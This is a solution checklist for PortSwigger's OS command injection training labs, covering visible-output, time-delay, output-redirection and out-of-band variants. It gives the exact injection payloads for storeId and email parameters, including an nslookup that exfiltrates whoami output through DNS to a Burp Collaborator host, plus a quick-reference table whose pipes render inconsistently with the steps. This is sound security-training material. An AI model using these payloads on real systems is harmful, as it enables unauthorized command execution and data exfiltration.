
# PortSwigger Mystery Labs — OS Command Injection Checklist

> Use this checklist to solve any OS command injection mystery lab. First, identify the injection point and lab type, then follow the matching steps below.

---

## Identifying the Lab Type

**Is there a stock check button on a product page?** → Simple case. Inject into `storeId`.

**Is there a feedback form?** → One of the four blind variants:

- Response is delayed → **Time delay lab**
- There is a writable image directory → **Output redirection lab**
- Neither of the above → Out-of-band variant:
    - Just need to prove execution → **OOB interaction lab**
    - Need to exfiltrate data → **OOB data exfiltration lab**

> **Recon tip:** Map every user-controlled parameter through Burp HTTP history before touching anything. The injection point is almost always `email` (feedback form) or `storeId` (stock check).

---

## Lab 1 — Simple OS Command Injection (Visible Output)

- [ ] Browse to any product page and click **Check stock** with Burp intercepting.
- [ ] Find the stock check request in **Proxy > HTTP history** and send it to Repeater.
- [ ] In Repeater, change the `storeId` parameter value to `1|whoami`.
- [ ] Send the request and confirm the current username appears in the response. Lab solved.

**Key concept:** The `|` operator pipes the output of `whoami` directly into the HTTP response.

---

## Lab 2 — Blind OS Command Injection (Time Delay)

- [ ] Navigate to the feedback form and submit it with Burp intercepting.
- [ ] Find the `POST /feedback/submit` request in Proxy > HTTP history and send it to Repeater.
- [ ] Change the `email` parameter value to `x||ping+-c+10+127.0.0.1||`.
- [ ] Send the request and confirm the response takes ~10 seconds. Time delay proves blind injection. Lab solved.

**Key concept:** No output is returned, but the 10-second delay from 10 ICMP pings to localhost confirms the injected command executed.

---

## Lab 3 — Blind OS Command Injection (Output Redirection)

- [ ] Navigate to the feedback form and submit it with Burp intercepting.
- [ ] Find the `POST /feedback/submit` request and send it to Repeater.
- [ ] Change the `email` parameter to `||whoami>/var/www/images/output.txt||`.
- [ ] Send the request and confirm a normal (non-delayed) response — output was redirected to disk.
- [ ] Intercept a product image request (or find one in HTTP history) and send it to Repeater.
- [ ] Change the `filename` parameter to `output.txt`.
- [ ] Send the request and confirm the `whoami` output appears in the response. Lab solved.

**Key concept:** Output is redirected into a writable web-accessible directory, then retrieved by fetching it as a normal image file.

---

## Lab 4 — Blind OS Command Injection (Out-of-Band Interaction)

- [ ] Open the lab, navigate to the feedback form, and submit it with Burp intercepting.
- [ ] Send the caught `POST` request to Repeater.
- [ ] Open the **Collaborator** tab (Burp menu) and click **Copy to clipboard** to grab your subdomain.
- [ ] In Repeater, replace the `email` parameter with:
    
    ```
    x||nslookup+x.YOUR-COLLABORATOR-SUBDOMAIN||
    ```
    
- [ ] Send the request.
- [ ] Switch to the Collaborator tab, click **Poll now**, and confirm a DNS lookup came in. Lab solved.

**Key concept:** With no direct output and no writable path, `nslookup` triggers an out-of-band DNS request to Burp Collaborator — proving execution via the network. The `||` chains the command regardless of the first command's result.

---

## Lab 5 — Blind OS Command Injection (Out-of-Band Data Exfiltration)

- [ ] Open the lab, navigate to the feedback form, and submit it with Burp intercepting.
- [ ] Send the caught `POST` request to Repeater.
- [ ] Open the **Collaborator** tab and click **Copy to clipboard** to grab your unique subdomain.
- [ ] In Repeater, replace the `email` value with:
    
    ```
    ||nslookup+`whoami`.YOUR-COLLABORATOR-SUBDOMAIN||
    ```
    
    _(Note the backticks around `whoami` — these execute it as a subcommand.)_
- [ ] Send the request.
- [ ] Switch to Collaborator, click **Poll now**, and wait a few seconds (retry if nothing appears yet).
- [ ] In the DNS interaction, open the **Description** tab — the full looked-up domain will be something like `peter-abc123.YOUR-COLLABORATOR-SUBDOMAIN`.
- [ ] Copy the username prefix (e.g. `peter-abc123`) and submit it back in the lab to complete it. Lab solved.

**Key concept:** Backticks make the shell execute `whoami` as a subcommand. Its output becomes part of the DNS hostname — tunneling data out through DNS. This differs from Lab 4, which only proves execution without extracting data.

---

## Quick Reference — Payloads

| Lab                | Parameter | Payload                                 |
| ------------------ | --------- | --------------------------------------- |
| Simple             | `storeId` | `1\|whoami`                             |
| Time delay         | `email`   | `x\|ping+-c+10+127.0.0.1\|`             |
| Output redirection | `email`   | `\|whoami>/var/www/images/output.txt\|` |
| OOB interaction    | `email`   | `x\|nslookup+x.BURP-COLLAB\|`           |
| OOB exfiltration   | `email`   | `\|nslookup+\`whoami`.BURP-COLLAB\|`    |
